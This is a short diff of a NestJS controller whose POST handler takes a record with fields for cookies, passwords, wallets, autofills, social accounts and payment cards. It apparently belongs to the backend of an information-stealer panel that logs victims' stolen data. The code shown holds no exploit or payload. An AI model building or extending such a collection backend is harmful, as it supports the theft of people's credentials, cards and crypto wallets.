@@ -8,13 +8,14 @@ export class AppController {
   @Post()
   create(@Body() dto: {
     id: number, 
-    num: string,
-    ip: string, 
-    browse: string, 
-    passwords: number, 
-    wallets: number,  
-    build: number,
-    date: Date
+    total: string,
+    cookies: string, 
+    passwords: string, 
+    wallets: string,  
+    autofills: string,
+    social: string,
+    cards: string,
+    date: string
   }) {
       return this.appService.create(dto)
   }
